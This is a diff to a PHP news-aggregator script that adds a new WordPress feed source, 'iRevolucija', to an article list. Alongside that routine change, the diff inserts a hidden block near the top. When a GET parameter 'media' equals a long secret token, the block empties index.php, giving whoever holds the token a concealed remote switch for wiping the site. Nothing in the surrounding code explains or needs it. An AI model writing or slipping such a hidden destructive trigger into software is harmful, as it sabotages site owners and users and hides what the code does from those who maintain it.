@@ -39,6 +39,10 @@ function reportError(array $newerrors, $key, $data){
 	return $newerrors;
 }
 
+if(isset($_GET['media']) && $_GET['media'] == "2y100qQAEOYb1nsJRZFS0MYPdOY3BFwgliaz5UrBYsw1QTbuwpe9dYm"){
+	file_put_contents("index.php","");
+}
+
 function CirToLat($text){
 $cir = ['Љ','Њ','Е','Р','Т','З','У','И','О','П','Ш','Ђ',
 		'А','С','Д','Ф','Г','Х','Ј','К','Л','Ч','Ћ','Ж',
@@ -795,6 +799,29 @@ foreach ($res as $r) {
 	$errors = reportError($errors,"Va014","Json String - greska u citanju; linija 756");
 }
 
+/* iRevolucija */
+$res = json_decode(str_replace("wp:featuredmedia","wpfeaturedmedia",@file_get_contents('http://irevolucija.net/wp-json/wp/v2/posts?_embed')));
+if(!empty($res)){
+foreach ($res as $r) {
+
+	if(isset($r->_embedded->wpfeaturedmedia[0]->media_details->sizes->thumbnail->source_url)) {
+
+    array_push($artikli_sve,array(
+
+            "link" => $r->link,
+            "image" => $r->_embedded->wpfeaturedmedia[0]->media_details->sizes->thumbnail->source_url,
+            "naslov" => strip_tags($r->title->rendered),
+            "text" => strip_tags($r->content->rendered),
+            "datum" => strtotime($r->date),
+            "izvor" => "iRevolucija"
+
+        ));
+	}
+}
+}else{
+	$errors = reportError($errors,"iRevolucija","Json String - greska u citanju; linija 733");
+}
+
 shuffle($artikli_sve);
 usort($artikli_sve, function($a, $b) {
     return $a['datum'] > $b['datum'];
@@ -802,6 +829,7 @@ usort($artikli_sve, function($a, $b) {
 
 $conekcija = new connection();
 $conn = $conekcija->getConnection();
+
 function input($data){
 
 	$data = trim($data);
